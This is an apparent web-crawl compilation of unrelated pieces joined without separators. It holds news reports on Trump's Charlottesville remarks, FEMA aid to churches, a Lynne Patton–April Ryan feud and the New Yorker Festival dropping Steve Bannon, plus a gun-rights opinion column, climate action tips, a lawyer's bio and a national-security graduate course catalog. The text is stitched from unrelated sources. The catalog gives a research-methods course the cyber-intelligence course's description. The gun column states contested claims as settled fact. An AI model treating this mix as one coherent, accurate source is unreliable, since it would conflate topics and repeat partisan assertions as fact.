A defiant President Donald Trump on Tuesday reverted to his original sentiment on the recent violence in Charlottesville, Virginia, declaring that “both sides” deserved blame for clashes that centered around a rally involving white supremacists.
Flanked by Cabinet officials in the lobby of Trump Tower in New York City, the president was expected to make only a brief statement about an executive order on infrastructure.
Instead, he was clearly ready for a fight and invited a Q&A with reporters that reexamined the cause of Saturday’s deadly violence, clearly rebelling against a cadre of advisers who had steered him toward a more unifying message that strongly condemned racist culprits.
Whereas Trump singled out the “KKK, neo-Nazis, white supremacists and other hate groups” in a scripted speech Monday from the White House, on Tuesday he spoke extemporaneously and said it was a much more “complicated” situation.
He explained that his original Saturday statement – which was roundly criticized for not calling out the hate groups that descended upon Charlottesville – was simply an initial reaction until he gathered all the facts.
He then went on to raise the culpability of other side – pointing to what he called the “alt-left” – for participating in the fighting and chaos that led to the death of a young woman and the injuries of many others.
“What about the alt-left that came charging at the, as you say, the alt-right? Do they have any semblance of guilt?” he asked a reporter. “What about the fact they came charging, that they came charging with clubs in their hands, swinging clubs, do they have any problem? I think they do.”
He continued, “You had a group on one side that was bad, and you had a group on the other side that was also very violent, and nobody wants to say that. But I’ll say it right now.”
Trump also said many people unaffiliated with widely reviled factions like neo-Nazis congregated in Charlottesville simply to protest the planned removal of a statue of Confederate Gen. Robert E. Lee, and asked whether his opponents believed other monuments to national figures with checkered pasts should be taken down.
“Was George Washington a slave owner? So will George Washington now lose his status? Are we going to take down statues to George Washington?” he asked. “How about Thomas Jefferson? What do you think of Thomas Jefferson – you like him? … Are we going to take down the statue because he was a major slave owner? … You’re changing history, you’re changing culture.”
The entire episode was a striking display of Trump’s raw rebellion against conventional political expectations. While the president seemed agitated by the national outcry that deemed his responses insufficient or late, he also appeared armed for bear to show his critics as partisan or hypocritical.
Trump’s freewheeling and unfiltered answers will infuriate his opponents and are likely to wash away any of the goodwill he regained from his remarks on Monday. But the display will simultaneously galvanize his base of supporters, which ranges from anti-establishment conservatives to the darker corners of the white nationalist movement.
Conservative provocateur Ann Coulter could barely contain her joy Tuesday afternoon, declaring that the president was “not dead yet.”
Shortly thereafter, former Ku Klux Klan leader David Duke tweeted, “Thank you President Trump for your honesty & courage to tell the truth about #Charlottesville & condemn the leftist terrorists in BLM/Antifa.” His abbreviations referred to the Black Lives Matter movement and leftist anti-fascist protesters, who appeared to have a presence in Charlottesville over the weekend.
The fact that Trump’s remarks send a reaffirming signal to white supremacists will only continue to haunt him in the days and weeks to come, opening him up to the charge that he sympathizes with and enables bigotry and discrimination. It will be a line of attack from which even Republicans will struggle to defend him.

GUN GRABBERS: Rules for Obama Vs. Rules for the Little People
Written by Rob Morse on August 2, 2016

What does President Obama do? The President’s children are protected by many men with guns. Our First Lady, Michelle Obama, said the same thing at this year’s national Democrat nominating convention. She said, “Big men with guns take my children to school.” What is good for the Obama family is also good for us and our children. Strangely, some of the speakers at the recent Democrat nominating convention disagreed with our president. Connecticut Senator Chris Murphy said our children should be left unprotected. That is beyond sad or mistaken. That is evil.
Our children are worth protecting.
Democrat Senator Murphy didn’t tell you that schools are a disproportionate target. A quarter of all the active shooter incidents occur in our schools. The Democrat Senator didn’t tell you that too often teachers and staff are already stopping armed murderers with their bare hands. The Senator didn’t tell you that the vast majority of armed attacks are over well before the police ever arrive. Those facts don’t fit the well-funded gun-control narrative.
Let me tell you the truth. Our so called “gun-free” zones attract mass murderers. Too often, the defenders in our schools are disarmed by our own laws. while the crazies and criminals ignore those laws to attack our children precisely because they are defenseless. Our defenders are left barehanded and forced to use improvised weapons to protect our children. They do. They have. They will, and I for one am grateful.
Would you rather the murderer engage a defender or a helpless child? Would you rather the defender is trained and armed… or unarmed? The sooner the attacker is stopped, the fewer children are injured or killed.

Many states already encourage armed teachers in their schools.
Most of the people at the Democrat convention didn’t know that 39 states already allow some legal gun owners to carry on campus. Some states only allow guns in private cars and outside campus buildings. Some states require permission before a concealed carrier can carry on campus or in campus buildings. 9 states already allow a licensed concealed carrier to carry on campus… just as these gun owners carry everywhere else. Senator Murphy didn’t tell us that.
We have already accumulated thousands of man-years of experience with armed teachers carrying on campus. You don’t hear about that in the news… because it works. The experts who study mass violence say that having honest gun owners on campus is the best way to keep our children safe. The President certainly thinks it makes a difference in his children’s safety.
We should protect our children… the same way the President protects his children.
I have to ask you one more serious question. Why didn’t Democrat Senator Murphy tell you these important facts? Why did the news media keep these facts hidden? Our children are too important to leave them victims of Socialist lies.

Actions You Can Take
There are 2 primary responses to the risk of climate change:
Mitigation involves reducing greenhouse gas emissions and protecting forests to reduce the overall magnitude of climate change. Mitigation is the most effective approach to protecting future generations from catastrophic impacts.
The problem is, we need drastic and immediate cuts in emissions to avoid the most serious impacts in the future.
Adaptation includes actions that reduce our vulnerability to the negative impacts of climate change. Adaptation is needed because emissions already released into the atmosphere today cause further climate change for approximately 30 years.
The choice between mitigation and adaptation is a false one. We have to do both.
Here are some things YOU can do:
Get Involved in Positive Solutions
Over 1000 people participated in Rogue Climate’s event to call attention to climate change using art, youth, and the environment to gain support.
There are many groups that are working at the local, state, and federal level to create economic, social, and policy solutions. Here are a few of our favorite groups that are national in scope:
350.org
Citizen’s Climate Lobby
Grid Alternatives
iMatter Youth Movement
Our Children’s Trust
Be sure and let your elected leaders know your position on policy that affects greenhouse gas emissions. Call them often.
Take Charge of Your Own Carbon Footprint
Solar panels are cheaper than they have ever been, and many state and local rebates are in place to make them even cheaper. Electric cars are now affordable and there are many models to choose from. Public transportation is becoming more widely available. Telecommuting and teleconferencing technology have revolutionized remote communications. It is easier than ever make positive choices that support the local economy, save money and time, and take fossil fuels out of our daily lives.
Find many household, school, and workplace tips on the EPA’s website.
Work With Your Community to Initiate Action
Climate change may be a global phenomenon, but many of the solutions need to be implemented at the local level. Let your local decision makers know that you are concerned and want to see action.
Community Energy Plans - Many cities and towns are coming together to create Community Energy Plans – collaborative and regional blueprints for greening our energy sources. For step-by-step guidance on how to develop and implement such a plan, go to the U.S. DOE’s “State and Local Solution Center.”
The cities on this map are all undergoing the Community Energy Planning process in 2014-2015 as part of the Georgetown University Energy Prize. Many others are also using the framework, but are not included in the national competition.
Community Resilience - Many communities are increasing their resilience to protect citizens from increasing extreme events, such as floods, droughts, and wildfires. Community resilience planning addresses a variety of stressors to vulnerable populations and natural resources so that communities can withstand extreme events while protecting economic, social, and environmental well-being. Get more information on developing community resilience in a highly collaborative manner..

FEMA rethinking ban on disaster aid to church buildings
In Associated Press, Church in the US
David Lieb
Nov 7, 2017
ASSOCIATED_PRESS
In this Aug. 31, 2017 file photo, Vice President Mike Pence, with his wife Karen, speaks to residents affected by Hurricane Harvey during a visit to the First Baptist Rockport Church in Rockport, Texas. The Federal Emergency Management Agency is rethinking a policy that routinely denies aid to religious institutions if the money will be used to rebuild sanctuaries damaged or destroyed in natural disasters. Several churches hit by recent hurricanes are challenging the policy in court. First Baptist's Senior Pastor Scott Jones said he doesn't fault others who seek FEMA aid, but his church won't be doing so. (Credit: Eric Gay/AP.)
FEMA grants are available to religiously affiliated schools, health care providers and nursing homes. And FEMA also can provide money to repair church-run facilities that function like community centers, but only if less than half the space or use is for religious purposes. Now the federal disaster agency is rethinking its policy after religious organizations sued, saying they are being discriminated against based solely on their faith.
When disaster strikes, houses of worship are often on the front lines, feeding and sheltering victims. Yet churches, synagogues and mosques are routinely denied aid by the Federal Emergency Management Agency when it comes time to repair or rebuild their damaged sanctuaries.
Pressure is mounting to change that after this year’s series of devastating hurricanes damaged scores of churches in Texas, Florida and Puerto Rico.
FEMA is rethinking its policies in the face of a federal lawsuit, scheduled for hearing Tuesday, by three Texas churches hit by Hurricane Harvey. President Donald Trump has signaled his support, via Twitter, for the religious institutions.
At the same time, several members of Congress have revived legislation — first proposed after 2012’s Hurricane Sandy — that would force FEMA to pay for repairs at places of worship.
The debate centers on two key questions: Does providing such aid violate the First Amendment separation of church and state? Or is it an infringement on the First Amendment right to free exercise of religion to deny churches the same aid available to numerous other nonprofit organizations, such as libraries, zoos and homeless shelters?
“It seems like the only reason churches are excluded is because they’re churches, and it just seems discriminatory to me,” said Bruce Frazier, pastor of Rockport First Assembly of God Church, which is part of the lawsuit.
Religious entities already can receive some government help in disasters. They can be reimbursed by local governments for sheltering evacuees and can receive U.S. Small Business Administration loans to repair their buildings. FEMA grants are available to religiously affiliated schools, health care providers and nursing homes. And FEMA also can provide money to repair church-run facilities that function like community centers, but only if less than half the space or use is for religious purposes.
Over the past five years, FEMA has authorized a net of $113 million for about 500 religiously affiliated entities such as schools, medical clinics and community centers after hurricanes, tornadoes, floods and other disasters, according to an AP analysis of data made public as part of the lawsuit.
But FEMA hasn’t supplied money to repair sanctuaries, and its 50 percent rule excludes many other types of church facilities.
“It is the faith community that responds so robustly to the need. And then to say, ‘Tough luck, we’re not going to help you put your own facility back together’ is wrong,” said Rep. Christopher Smith, a New Jersey Republican sponsoring the bill that would change the policy.
Not everyone shares that view, noting constitutional concerns.
“I really can’t see anything more core and more of an establishment of religion than building a house of worship,” said Maggie Garrett, a lawyer who has lobbied against FEMA aid to religious institutions on behalf of Americans United for Separation of Church and State.
FEMA declined to comment, citing the lawsuit. But in a court filing, the U.S. Justice Department said the challenged policies are being reconsidered.
High winds and flooding from Hurricane Katrina in 2005 damaged more than 1,000 buildings owned by the Roman Catholic Archdiocese of New Orleans. FEMA later came through with more than $300 million, an amount the archdiocese’s chief financial officer, Jeff Entwisle, described as “extraordinary assistance.”
Even so, he estimated that FEMA deemed less than one-third of the buildings eligible for funding. The archdiocese opted not to rebuild nearly one-quarter of its churches and schools.
When Hurricane Harvey slammed Texas in August, it blew down the steeple, ripped away the front doors and destroyed the roof of Frazier’s church, causing extensive water damage. The church applied for FEMA disaster aid but was directed instead to private insurance coverage and the Small Business Administration for a loan.
Frazier said the church of about 125 members couldn’t afford wind-storm insurance and can’t even afford the loan payments that would be necessary to fully rebuild.
“We’re just asking to get help,” Frazier said. “I mean, we’re struggling.”
The Roman Catholic Archdiocese of Galveston-Houston and Congregation Torah Vachesed, a Houston-area synagogue flooded by Harvey, filed briefs in support of the churches that are suing. The synagogue asserted that the “pernicious effect of FEMA’s policy of explicit discrimination” is “to deter and discourage the exercise of the Jewish faith.”
The lawsuit contends hundreds of other places of worship also are being denied access to FEMA funding, but it’s hard to say how many would seek federal aid if given the opportunity or how much money is at stake.
First Baptist Rockport Church, a mile from the First Assembly of God, sustained about $1 million in damage when Hurricane Harvey collapsed a choir room wall and caused leaks in the roof. Senior Pastor Scott Jones said he doesn’t fault others who seek FEMA aid, but his church won’t be doing so.
“We believed that God would provide for us another way, and that we were going to respect the separation of church and state, and not expect or count on help from the federal government,” Jones said.
Last June, the U.S. Supreme Court found that a Lutheran church in Columbia, Missouri, had been wrongly excluded from a state grant program to install a soft playground surface made of recycled tires. Chief Justice John Roberts called it “odious to our Constitution” to deny an otherwise eligible recipient solely because it’s a church.
Richard W. Garnett, a University of Notre Dame law professor who runs the school’s program on Church, State and Society, said that based on that ruling, there is a good chance the high court would allow FEMA to provide aid to rebuild places of worship.
“The purpose of the support would not be to subsidize religious worship but rather to clean up the community and help local institutions that themselves provide important relief services to those in need,” Garnett said.
Associated Press Writer Ryan J. Foley in Iowa City, Iowa, contributed to this report.

U.S. Annual Average Temperature
Figure -.17
North Carolina State University
Laura Stevens
This figure appears in chapter appendix-5-frequently-asked-questions of the Impacts, Risks, and Adaptation in the United States: The Fourth National Climate Assessment, Volume II report.
This figure shows the annual average surface temperature for the contiguous U.S. (black line) from 1960 to 2017, and the long-term warming trend (red line). Climate change refers to the changes in average weather conditions that persist for an extended period of time, over multiple decades or even longer. Year-to-year and even decade-to-decade, conditions do not necessarily tell us much about long-term changes in climate. One cold year, or even a few cold years in a row, does not contradict a long-term warming trend, just as one hot year does not prove it.

April Ryan Thursday afternoon said she did not accept a tweeted apology from a Trump appointee who fat-shamed her on Twitter. Ryan said she is anxious to talk to the official’s boss, Ben Carson, about the attack.

Sean Hannity To Interview Donald Trump On Wednesday
A Twitter war that erupted between Ryan and event-planner turned HUD honcho Lynne Patton foamed over when Patton called Ryan “Miss Piggy” in one of her shots.
“I hear #MissPiggys still on a rampage,” she wrote in the since-deleted tweet, adding “Gee, I must’ve struck a nerve,” as well as the hashtag “BankruptBlogger.”
In a subsequent tweet, Patton boasted, “I deleted my last tweet by choice.”
“No one from this Administration contacted me. It was beneath me & I apologize to @AprilDRyan,” tweeted Patton, who heads the regional Housing and Urban Development office that oversees New York and New Jersey.
“My parents raised me to respect others & I regret my response. I apologize to them, @SecretaryCarson & the Trump family. They deserved better.”
Thursday afternoon, Ryan said she does not accept Patton’s apology. “This is serious. This is not a joke,” she told People.
The Twitter tirade appears to have started when Ryan appeared on CNN’s Sunday media-analysis show Reliable Sources, telling host Brian Stelter she is among the journalists who have received death threats since President Donald Trump made it okay to attack the press and the First Amendment.
Patton was not impressed, tweeting: “As a conservative black female who has publicly worked for & supported @realDonaldTrump, I’ve been getting death threats from fellow minorities on the left for the past 3 years — so welcome to the club. @AprilDRyan.”
To say it escalated from there is an understatement:
Obviously someone who occupies a lot of space in your head since you can’t stop tweeting about me…😘 pic.twitter.com/L8KhnKjVD4

2ND UPDATE, 6:50 PM: Never one to mince words, Steve Bannon has fired back in his battle with The New Yorker. After being scheduled as a headliner of the October 5-7 event, the former White House Chief Strategist was disinvited after a slew of people including Judd Apatow, Jim Carrey and John Mulaney said they wouldn’t participate if Bannon was part of it. The ex-Breitbart chief fired back In a statement to tonight.

'The Brink' Trailer: Steve Bannon Tells Filmmakers "I'm About Winning"
“The reason for my acceptance was simple: I would be facing one of the most fearless journalists of his generation,” Bannon told the paper from Venice, where he is taking in a screeening of American Dharma, a new Errol Morris documentary about Bannon. “In what I would call a defining moment, David Remnick showed he was gutless when confronted by the howling online mob.”
UPDATED 3:47 PM PT: As the backlash quickly flooded Twitter, the New Yorker Festival has announced that they have dropped Steve Bannon as a headliner at the fest.
New Yorker staff writer and Pulitzer Prize winner Kathryn Schulz took to Twitter once again to confirm the announcement of the fest dropping Bannon.
“Thanks to everybody for the unequivocal public response,” she wrote. “David Remnick has just informed the staff that the [Steve] Bannon event has been canceled.
Looks like clean-up process of this messy incident has begun.
Thanks to everybody for the unequivocal public response. David Remnick has just informed the staff that the Steven Bannon event has been canceled.
— Kathryn Schulz (@kathrynschulz) September 3, 2018
PREVIOUS: That didn’t take long. Just hours after it was revealed that The New Yorker Festival had invited Steve Bannon as a headline interviewee, some high-profile names are withdrawing from the event. Judd Apatow, Jim Carrey and John Mulaney are among those to tweet that they will not be participating. Apatow wrote he would “not take part in an event that normalizes hate.” (See the tweets below).
Earlier, New Yorker staff writer and Pulitzer Prize winner Kathryn Schulz had said she was “appalled” by Bannon’s inclusion and encouraged likeminded people to email the magazine.
PREVIOUS, 1:28PM PT: Steve Bannon, Donald Trump’s controversial former chief strategist, has been set as a headliner during the upcoming New Yorker Festival — and some folks are calling foul. That includes Pulitzer Prize winning staff writer Kathryn Schulz who tweeted, “I love working for @NewYorker, but I’m beyond appalled by this” and suggested those who feel likewise should email the magazine. (See more reactions below.)
It’s been a little more than a year since Bannon was ousted from the White House, although he’s never been far from the public eye, and today he’s trending on social media as the likes of Ava DuVernay and Chelsea Clinton weigh in on The New Yorker‘s invitation. (Bannon also features in a new documentary by Errol Morris which is debuting at the Venice Film Festival this week.)
NYer Editor David Remnick, however, told the New York Times, “I have every intention of asking (Bannon) difficult questions and engaging in a serious and even combative conversation.”
The event is held in various venues across the city — Bannon’s interview will be at the New York Society for Ethical Culture. It also features voices from the arts who include Jim Carrey, Emily Blunt, John Krasinski, Maggie Gyllenhaal, Zadie Smith and Janet Mock — making Bannon seem even more of a square peg.
Here’s what folks are saying:
If Steve Bannon is at the New Yorker festival I am out. I will not take part in an event that normalizes hate. I hope the @NewYorker will do the right thing and cancel the Steve Bannon event. Maybe they should read their own reporting about his ideology.
— Judd Apatow (@JuddApatow) September 3, 2018
Bannon? And me? On the same program?
Could never happen.
— Jim Carrey (@JimCarrey) September 3, 2018
I apologize to Susan Morrison as I was really looking forward to our conversation. And I look forward to future @NewYorker Fests & other public, even heated, debates between different voices. But hard pass on this amateur-night sonofabitch.
— John Mulaney (@mulaney) September 3, 2018
I was scheduled to appear at The New Yorker Festival in a conversation with @MJSchulman whom I love dearly. After learning of the inclusion of Steve Bannon, I am respectfully saying fuck that. Peace and love!

He created an online home for white nationalists to groom and grow their violent base. He cemented his destructive white supremacist views into the DNA of the White House. Now, New Yorker is selling tickets to see him headline. And here we are, folks. https://t.co/JyK8J13Zko
— Ava DuVernay (@ava) September 3, 2018
For anyone who wonders what normalization of bigotry looks like, please look no further than Steve Bannon being invited by both @TheEconomist & @NewYorker to their respective events in #NYC a few weeks apart. https://t.co/u0TDfCYrQ1

Hey, New Yorker, I'm happy to come see Steve Bannon speak at your festival if Robert Muller is asking the questions.
— Whitney Cummings (@WhitneyCummings) September 3, 2018
Come ON, @NewYorker. The only person who should be interviewing Steve Bannon is Robert Mueller.

1) Announce Steve Bannon as a speaker at your conference.
2) Sell some tickets.
3) Receive massive outrage.
4) Sell more tickets.
5) Say you’re going to challenge him.
6) Sell more tickets.
7) Allow Bannon to ignore questions and spew bullshit for two hours.
8) Rinse, repeat.

Martin Mendelsohn
Vice Chair
Board of Trustees
Martin Mendelsohn was a private lawyer for more than 30 years and has been licensed to practice law (in Washington, D.C., New York, and all Federal Courts and agencies) for more than 50 years.
From 1966 to 1980, Mendelsohn served in a variety of public legal roles including Attorney Adviser Office of General Counsel, Department of Health Education and Welfare and First Chief of Office of Special Investigations in the United States Department of Justice. In the latter role, he developed procedures for the investigation and prosecution of Nazi War criminals in the United States. During the investigation, he established cooperative working relationships with the officials of relevant governments in Europe and elsewhere and negotiated agreements for cooperation between governments including video taping of witnesses who could not travel to the United States.
From 1991 to 2012, Mendelsohn practiced law in the private sector. He represented a major US confectionary company as they sought to negotiate an investment agreement with Russian authorities. The agreement resulted in close to $1 billion in USD being invested in Russia, which created more than 2,500 jobs for Russian citizens. In 1991, he was appointed by the District Court in Stuttgart, Germany to represent the victims in the war crimes trial of Josef Schwamberger. Mendelsohn also represented a major US aircraft manufacturer in the negotiation and sale of aircraft to countries in Central and Eastern Europe from 1995 to 2012.

RST 644, POLITICS & STATECRAFT OF SUB-SAHARAN AFRICA
While threats of the 20th century arose from powerful nation states, the key dimensions of the future – globalization, multi-national violent conflicts, and the potential proliferation of weapons of mass destruction mean great dangers from the relative weak states and ungoverned areas of Africa. Globalization enhances the awareness of the world to the most basic events, making speed of analysis and decision making more important and the consequences more significant. The objective of this course is to transform how professionals think about Africa and its interactions with the rest of the world.
INT 714, COUNTER INTELLIGENCE
The aim of this course is to show how counterintelligence activity protects US national security by 1) defending against acts of penetration, sabotage, and physical violence undertaken by foreign intelligence agencies and 2) defeating an adversary’s efforts by identifying and manipulating its behavior through deception and/or the exploitation of its agents. The course addresses the relationship between the intelligence and law enforcement communities as well as between civilian and military agencies. It also emphasizes the increasing importance of cyber espionage and economic espionage in an age of globalization.
Through this course, students will
Analyze methods to defend against foreign and domestic espionage;
Elaborate the use of deception to defeat other actor’s intelligence capabilities;
Examine the role of espionage and counterintelligence as means of achieving national goals;
Assess the growing relationship between the intelligence and law enforcement communities and the relationship between civilian and military agencies;
Evaluate the role of counterintelligence in cyber espionage and economic espionage;
Communicate ideas clearly, concisely, and effectively in writing, discussions, and presentations
NSC 732, LOW INTENSITY CONFLICT
The course is a detailed examination of the theory and practice of conflict in circumstances less than general conventional war. Key concepts and strategic principles pertaining to asymmetric warfare, terrorism, insurgency and counterinsurgency, irregular warfare, unconventional warfare, and military operations less than war (peacekeeping and humanitarian assistance) will be examined. This course examines the causes, conduct, patterns, and effects of conflict short of total or general war. It covers the modern insurgency period from Mao Tse Tung’s approach in the Chinese Civil War through our present times with the Global Jihad.
It asks four fundamental questions in the U.S. context:
What is modern war in today’s contemporary operating environment?
What paths has it traveled in the post-World War II era into the early 21st Century?
What are the trends and where is it headed
RST 727, RUSSIAN POLITICS AND STATECRAFT
This survey course on Russian politics and statecraft addresses enduring questions on: patterns of cooperation and confrontation with other great powers, a centrally dominated economy, and a political culture that exploits weak formal political institutions to sustain a very small leadership ground. In addressing these issues, we ask: What are the wars that have defined Russia’s borders? When and why do Russian leaders challenge other states? What does power in Russia look like? Who are the rulers and their supporters? How do they obtain, practice, and lose power?
In reviewing the origins and practices of Russian statecraft, we will assess when Russia as a great power has been (dis-) satisfied with the international distribution of economic and political benefits, and when it has sought to revise or maintain the international order. We will use this knowledge to address current issues in Russia’s relations with the Euro-Atlantic alliance and other world powers, including contentious issues such as money laundering, sanctions regimes, “information wars,” and Russia’s declared and undeclared conflicts.
NSC 601, INTRODUCTION TO NATIONAL SECURITY
This course is divided into four parts. Part I will focus on generally accepted concepts of deception and counter deception with an emphasis on the underlying concepts that enable operational and strategic deceptions. Part II is designed to introduce the student to operational level deception and its impact on national decision making and warning. Part III will build upon parts one and two in order to facilitate the construction of a holistic model for Russian Strategic Deception and Information Confrontation. Part IV will move beyond strategic military and information confrontation and analyze strategic-political deception and provocations and apply previous concepts to a detailed analysis of current events.
INT 746, CYBER INTELLIGENCE
This course examines the vast frontier of Cyberspace and the Internet over which travels ever increasing amounts of information and communications. This new dimension of power has strong positive and negative implications for U.S. national security strategy and policy. For national security, Cyberspace represents a unique challenge, as it has no borders or boundaries unlike previous power dimensions — land, sea, air and space. Past separations between government and the private sector and national security and law enforcement have been blurred. Cyberspace also represents an arena where a non-state actor’s powers can equal or exceed any nation state. And, 20th Century based government institutions often have trouble reacting to its 21st century instantaneous speed, ubiquity and volume.
By the end of the course, the student will be able to:
Address the issues of volume, velocity and veracity of information in cyber space and how they relate to intelligence gathering, analysis and dissemination in both the public and private sector;
Evaluate the ability of non-nation state players to effect national and corporate security;
Understand the challenges of devising systems to secure the current internet;
Examine the legal and politic implication of a system without borders
RST 643, THE CONTEMPORARY MIDDLE EAST: A NEW LOOK AT CHANGING REGIONAL DYNAMICS
This course aims to provide students with an understanding of the changing regional dynamics of the Middle East. The region serves as the primary source for international energy consumption, yet remains an epicenter of instability, radicalism and terrorism. The 2010 Arab uprisings, Iran’s quest for nuclear capability and the rapid expansion of Islamic State have greatly increased the volatility by threatening the sovereignty and territorial integrity of regional states. A resurgence of political Islam and growing sectarian divide between Sunnis and Shiites add to the regional disorder. Middle Eastern states too weak to control their territory lack the legitimacy or kinetic ability to exert full control over their borders. In these fragile areas, state and non-state threats thrive and pose tremendous national security challenges and concerns for the region and beyond.
The course will examine the national security challenges facing Syria, Lebanon, Iraq, Turkey, Egypt, Saudi Arabia, Iran, Jordan, Israel, and the Palestinians, and analyze how recent shifting political, social, and economic dynamics impact them. The course will focus on the regional actors’ attitudes of the challenges and threats they face and on the strategies they have chosen to confront them. It thus provides critical perspective to students seeking a more comprehensive understanding of the changing Middle Eastern landscape and foreign policy. The course is designed for students interested in the Middle East, particularly those interested in national security issues, students of comparative politics and future practitioners, with a curiosity in regional studies.
INT 639 – RESEARCH METHODS FOR THE SOCIAL SCIENCES
This course examines the vast frontier of Cyberspace and the Internet over which travels ever increasing amounts of information and communications. This new dimension of power has strong positive and negative implications for U.S. national security strategy and policy. For national security, Cyberspace represents a unique challenge, as it has no borders or boundaries unlike previous power dimensions — land, sea, air and space. Past separations between government and the private sector and national security and law enforcement have been blurred. Cyberspace also represents an arena where a non-state actor’s powers can equal or exceed any nation state. And, 20th Century based government institutions often have trouble reacting to its 21st century instantaneous speed, ubiquity and volume.

MDV 701 teaches students to use and evaluate analytics on how audiences perceive issues, what drives them to action, and how to measure effectiveness. The course does not make students experts in doing analytics, but merely how to understand the design, creation and measurement of persuasive strategies from a program management point of view. This course covers many types of behavioral analytics including polling, surveys, experts, big data and others. Concepts such as quantitative, qualitative, quant/qual, discovery and directed search are introduced for MDV majors. Combined with MDV 700 Integrated Risk Value Concepts, MDV 701 provides in-depth practical understanding, processes and concepts needed for MDV majors to become practitioner who manage and evaluate the development, implementation and impact of persuasive strategies.
NSC 733, DIPLOMACY AS AN ELEMENT OF NATIONAL POWER
How is Diplomacy changing in a globalized world with all of the new challenges in the 21st Century? What impact has globalization had on the rules based system of International Order?

Students who complete this course will:
• Identify the members of the Intelligence Community and their roles;
• Discuss the intelligence cycle and other functions of intelligence; and
• Analyze the relationship of the IC with the different branches of government and the public
NSC 730, NATIONAL SECURITY PLANNING, STRATEGY AND DECISION MAKING FOR THE 21ST CENTURY
Washington’s problem in a nutshell is that it doesn’t think very well. The last quarter century has seen an explosion in the human capacity to create and manipulate new knowledge—yet many of the instruments used to support national security leadership are as creaky as ever. All this needs to change if America wants to outthink it enemies and it help it friends secure a safe, free, and prosperous future. This course provides both an introduction to the theoretical constructs and practical exercises in the three critical pillars of overseeing national security affairs—planning, strategy, and decision-making. Lessons provide a foundation for the skills, knowledge, and attributes to analyze, address, and manage national security affairs at the operational and strategic levels.
MDV 729, RUSSIAN DECEPTION, OPERATIONS, AND INFORMATION CONFRONTATION
Russian Deception Operations and Information Confrontation is designed to lay the historical, thematic and contemporary context that will provide the fundamental perspective and foundational knowledge required to successfully recognize, analyze and initiate counter deception activates. This course is designed for analysts in order to equip them with the necessary knowledge to understand the impact of Russian deception. This in-depth study of Russian deception practices will trace the evolution of the art specific to Russian over the course of the past century starting in 1917 and ending with the implementation of Russia’s Information Confrontation doctrine. The course is designed to address these issues functionally starting with basic military/tactical deceptions and progressing through the use of strategic enablers, provocations and influence operations.
NSC 712, NUCLEAR WEAPONS/MISSILE DEFENSE/WMD POLICY
Overview: An in depth look at three critical Defense areas of Nuclear Weapons, Missile Defense and Countering WMD Policies that have been revised in 2017 and 2018.
Nuclear Weapons: On January 27, 2017, President Donald Trump directed Secretary of Defense James Mattis to initiate a new Nuclear Posture Review (NPR). The President made clear that his first priority is to protect the United States, allies, and partners. He also emphasized both the long-term goal of eliminating nuclear weapons and the requirement that the United States have modern, flexible, and resilient nuclear capabilities that are safe and secure until such a time as nuclear weapons can prudently be eliminated from the world.
Missile Defense: The Trump administration is working on an expanded U.S. missile defense policy that would address certain threats from Russia and China, departing from a previous strategy that focused nearly exclusively on rogue nations such as North Korea and Iran. The new policy will still call for bolstered technology against rogue states, with a particular focus on weapons to intercept North Korean leader Kim Jong Un’s missiles. But it will also mention the need to consider missile threats from Russia and China, according to people familiar with the review.
Countering WMD: The Department of Defense Strategy for Countering Weapons of Mass Destruction seeks to ensure that the United States and its allies and partners are neither attacked nor coerced by actors with WMD. It outlines three end states: no new WMD possession, no WMD use, and minimization of WMD effects. The strategy also establishes countering WMD priority objectives for the Department of Defense (DoD), defines an approach for achieving them, and identifies essential activities and tasks. Countering WMD (CWMD) objectives focus on cooperative efforts to shape the security environment and take early action against adversaries. These objectives are to reduce incentives to pursue, possess, and employ WMD; to increase the barriers to WMD acquisition, proliferation, and use; to manage WMD risks emanating from hostile, fragile, or failed states and safe havens; and to deny the effects of current and emerging WMD threats through layered, integrated defenses.
This course provides a critical overview of the Intelligence Cycle – from collection to analysis to presentation. The course assesses intelligence-gathering techniques and approaches for various types of information including HUMINT, SIGINT, etc. It then acquaints students with aspects of Intelligence Analysis; the evaluation of data through the use of subject expertise, critical thinking, and the application of techniques designed to overcome limitations in human cognition. It will examine the analysts’ role in the larger national security arena, state, and local organizations and in the private sector. And it will show the importance of the effective presentation of this information under varying circumstances and leadership desires.

RST 732, EURASIAN SECURITY
Coming Soon
ANNA’S STORY
She particularly enjoyed the way that he illuminated the theory of each topic by providing compelling historical examples together with his own personal experience and insights from his illustrious career in the National Security field.
“During the Bosnian wars, Dr. Meyer was The Deputy Chief of the CIA Taskforce in the Balkans. That’s the level of real-world experience that our professors have. We are taught and mentored in classes of around 7 students by faculty of that caliber. It makes for a phenomenal experience, probably unique to our school, I would venture to say.”
Anna also talks excitedly about Professor James Anibal’s exceptional teaching style where students engage in multiple thought-provoking exercises, including some where they try to build and break deception types, guided by Anibal’s own extensive experience in the field.
“Learning by completing these exercises really cements the theories in our minds. These classes are invaluable to any student interested in the topic and will – without a doubt – make us much better practitioners ourselves.”
Anna also enthuses about the significant potential of the DMGS’ student body, where she has found lifelong friends who share her passion as well as her determination to become a leader in the National Security and Intelligence communities. A testament to her care and pride for her fellow students, Anna takes an active role in DMGS’ Student Government Association, where she has served as Secretary, Treasurer, Vice-President and President.
“I can truly say that I am frequently inspired by the students of DMGS because of their constant drive to do more, achieve more, and learn as much as they can. I, myself, learn something from my fellow students every day.”
Anna is especially appreciative of the external experiences DMGS has made possible for her, including representing the school at the 2017 Women in National Security Conference and competing in the 2017 Atlantic Council Cyber 9/12 Competition. However, perhaps the most memorable opportunity afforded to her by Daniel Morgan was the chance to participate in the Oxford Analytica Global Horizons Conference in Oxford, England, in both 2017 and 2018. It is precisely through such enrichment provided by DMGS that Anna has been able to travel outside the United States for the first time in her life. Wide-eyed, she describes how exploring the campus and halls of the prestigious Christ Church College at Oxford University was a surreal experience for her, as she and her fellow DMGS students were able attend seminars, panels, and plenaries with experts from all over the world. She emphasizes how this experience effectively gave her a chance to expand her knowledge, her worldview, and her overall understanding of the importance of National Security and Intelligence studies at a global level. A lasting memory of this extraordinary opportunity was of the conference black-tie gala at Blenheim Palace, the familial home of Winston Churchill.
“The memory that will forever stand out to me is walking up the Palace stairs in a ball-gown on what was my third day ever in another country. It was truly magical!”
Finally, Anna sums up her experience at the school by crediting DMGS with advancing her career through networking opportunities where she was able to meet career professionals in the National Security and Intelligence communities that she would have never been able to meet otherwise. She is particularly grateful for the faculty who took the time to help her discover her passion so she could determine her career path and who have guided and opened doors for her.
“The school really invests in its students not just through education, but through external experiences as well, and that investment really pays off for us when it comes to establishing our careers. When deciding upon a graduate school, DMGS was my choice without hesitation and I would make the same decision again every time.”
